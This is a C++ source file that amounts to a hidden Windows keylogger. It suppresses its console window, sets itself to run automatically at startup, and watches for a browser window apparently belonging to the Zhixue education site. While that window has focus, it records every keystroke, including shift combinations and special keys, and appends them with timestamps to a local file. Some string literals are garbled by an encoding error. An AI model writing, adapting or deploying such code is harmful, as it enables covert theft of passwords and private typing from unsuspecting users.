#pragma comment( linker, "/subsystem:windows /entry:mainCRTStartup" )
#define ENABLE_TIME
#define Windows_ENABLE_KURZER
#define USE_ASCII
#include<SZN_MAI.H>
#include<SZN_OLD.H>
using namespace std;
const int length_ = 256;
void write(Stack<string>& p);
int keydu(int num, string s, Stack<string>&);
void keys_number_1(Stack<string>&);
string ch_1[]{ {"(Bak)"},{"(Tab)"},{"(Etr)"},{"(Esc)"},{"(Spa)"},{"(Del)"},{"(×ó)"},{"(ÉÏ)"},{"(ÓÒ)"},{"(ÏÂ)"},{"(CpL)"},{"(Win)"},{"(Win)"},{"(Ctr)"} };
int ch_1_len = sizeof(ch_1) / sizeof(ch_1[0]);
char ch_1_[]{ 0x08,0x09,0x0D,0x1B,0x20,0x2E,0x25,0x26,0x27,0x28,0x14,0x5B,0x5C,0x11 };
int main() {
	KUR::Kwin::SetAutoRun("zhixue");
	int count = 10;
	string str = "ÖÇÑ§Íø";
	TCHAR titles[length_] = { 0 };
	Stack<string> p(64);
	int y = 0;
	int len = 0;
	while (1) {
		HWND window = GetForegroundWindow();
		GetWindowText(window, titles, length_);
		string pw(titles);
		if (pw.find(str) != 0) {
			Sleep(count);
			y++;
			if (y >= 300) {
				y = 0;
				if (p[0] != "") {
					write(p);
				};
			};
		}
		else {
			keys_number_1(p);
			len = p.length();
			if (p.isfull()) {
				write(p);
			};
		};

	};
	system("pause");
	return 0;
}
void keys_number_1(Stack<string>& p) {
	Sleep(1);
	int ch = 0x41;
	int t = 0, k = 0;
	char pw[2] = "";
	string s;
	for (int i = 0; i < ch_1_len; i++) {
		keydu(ch_1_[i], ch_1[i], p);
	}
	for (int ch = 0x30; ch < 0x39; ++ch) {
		if ((GetAsyncKeyState(0x10) & 0x8000) && (GetAsyncKeyState(ch) & 0x8000)) {
			while ((GetAsyncKeyState(0x10) & 0x8000) && (GetAsyncKeyState(ch) & 0x8000));
			*pw = char(ch);
			s = pw;
			p.push("(shift+" + s + ")");
			k = 1;
		};
		if ((GetAsyncKeyState(ch) & 0x8000) && (k == 0)) {
			while (GetAsyncKeyState(ch) & 0x8000);
			*pw = char(ch);
			s = pw;
			p.push(s);
		};
	};
	for (; ch <= 0x5A; ++ch) {
		if ((GetAsyncKeyState(0x10) & 0x8000) && (GetAsyncKeyState(ch) & 0x8000)) {
			while ((GetAsyncKeyState(0x10) & 0x8000) && (GetAsyncKeyState(ch) & 0x8000));
			*pw = char(ch);
			s = pw;
			p.push(s);
			t = 1;
		};
	};
	if (t == 0) {
		for (ch = 0x41; ch <= 0x5A; ++ch) {
			if (GetAsyncKeyState(ch) & 0x8000) {
				while (GetAsyncKeyState(ch) & 0x8000);
				*pw = char(ch + 32);
				s = pw;
				p.push(s);
			};
		};
	};
	for (int ch = 0x60; ch <= 0x69; ++ch) {
		if (GetAsyncKeyState(ch) & 0x8000) {
			while (GetAsyncKeyState(ch) & 0x8000);
			*pw = char(ch - 48);
			s = pw;
			p.push(s);
		};
	};
};
int keydu(int num, string s, Stack<string>& p) {
	if (GetAsyncKeyState(num) & 0x8000) {
		while (GetAsyncKeyState(num) & 0x8000);
		p.push(s);
		return 1;
	}
	else {
		return 0;
	}
};
void write(Stack<string>& ch) {
	auto t = KUR_OLD::GETST();
	std::fstream F_("LTC.data", ios::app);
	string str_("[" + to_string(t.month) + ":" + to_string(t.day) + ":" + to_string(t.hour) + ":" + to_string(t.minute) + "]"), str_1;
	ch.flip();
	while (!ch.isempty()) {
		str_1 << ch;
		str_ += str_1;
	};
	str_ += "\n";
	F_ << str_;
	F_.close();
};